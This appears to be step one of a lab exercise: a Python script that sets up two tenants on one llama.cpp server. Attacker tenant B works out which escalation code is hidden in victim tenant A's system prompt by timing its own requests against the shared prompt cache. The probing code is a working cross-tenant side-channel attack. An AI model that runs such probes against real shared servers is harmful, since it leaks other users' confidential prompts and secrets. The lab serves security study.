"""Step 1: the fixture -- two tenants, one server, and the token anatomy that makes timing a signal.
Run from labs/:
    docker compose run --rm workbench python attack-cache-sidechannel/scripts/s01_tenants.py
"""
import labkit

labkit.banner()

import serving  # noqa: E402
import cachelab as C  # noqa: E402

B = serving.BASE_URL
tag = C.tag_for(0)

print(f"[note] one llama.cpp server ({(serving.get(B, '/props').json() or {}).get('build_info', '?')}), "
      f"one model, one prompt cache: tenant A (the victim app) and tenant B (the attacker) share all of it")
print(f"[note] tenant A is {C.SHOP}'s {C.ROLE}; every conversation's system prompt starts with a fresh tag, "
      f"names the shop, and hides one of four escalation codes")
print(f"[note] tenant B knows the template and the four candidate codes {C.CODES}; "
      f"it never sees A's text -- it times its own requests")

sp = C.system_prompt(C.CODES[0], tag)
print(f"\nvictim system prompt (code {C.CODES[0]}, tag {tag}), first and last 60 chars:")
print(f"  {sp[:60]!r}")
print(f"  ...{sp[-60:]!r}")

n_head = C.token_count(B, f"[{tag}] " + C.HEAD.format(code=""))
n_code = C.token_count(B, "ATLAS-CANARY-" + C.CODES[0]) - C.token_count(B, "ATLAS-CANARY-")
n_tail = C.token_count(B, " " + C.TAIL)
n_user = C.token_count(B, C.PROBE)
c0, c1 = C.system_prompt(C.CODES[0], tag), C.system_prompt(C.CODES[1], tag)
n_common = next(i for i in range(min(len(c0), len(c1))) if c0[i] != c1[i])
print(f"\ntoken anatomy of one probe request (the /tokenize counts; the chat template adds a header "
      f"and turn markers around them):")
print(f"  [{'tag + text up to the code':<44}] {n_head:>3} tokens   shared by every candidate")
print(f"  [{'ATLAS-CANARY-' + '<code>':<44}] {n_code:>3} tokens   the only part that differs")
print(f"  [{'the boilerplate tail':<44}] {n_tail:>3} tokens   skipped only when the prefix is cached")
print(f"  [{'user turn ' + repr(C.PROBE):<44}] {n_user:>3} tokens   always computed")
print(f"  candidates first differ at character {n_common}: right at the code, early in the prompt")

# a live round, unblinded, with the server's own counter as ground truth
print(f"\nround 0 (tag {tag}): tenant A answers a customer with code {C.CODES[0]} (the lab canary "
      f"{C.CANARY}); tenant B probes each candidate once")
r = C.victim_turn(B, C.CODES[0], tag)
print(f"  A's answer: {(r.json() or {})['choices'][0]['message']['content'][:56]!r}")
for code in C.CODES:
    sec, cache_n = C.probe(B, code, tag)
    live = " <- the live code" if code == C.CODES[0] else ""
    print(f"  B probes ATLAS-CANARY-{code}: {sec * 1000:6.1f} ms   cache_n {cache_n}{live}")

sec, cache_n = C.probe(B, C.CODES[0], tag)
print(f"\n  B probes the live code a second time: {sec * 1000:.1f} ms   cache_n {cache_n}")
print("  [note] now the cache holds B's own probe too: from here on timing says nothing about A.")
print("         every later round therefore starts a fresh conversation (a new tag), so each probe is")
print("         first contact again -- the one measurement the cache has not already answered")
props = serving.get(B, "/props").json() or {}
C.save("s01_tenants.json", {"tag": tag, "n_head": n_head, "n_code": n_code, "n_tail": n_tail,
                            "n_user": n_user, "chars_before_divergence": n_common,
                            "build": props.get("build_info"), "model": props.get("model_alias"),
                            "slots": props.get("total_slots"),
                            "n_ctx": (props.get("default_generation_settings") or {}).get("n_ctx")})
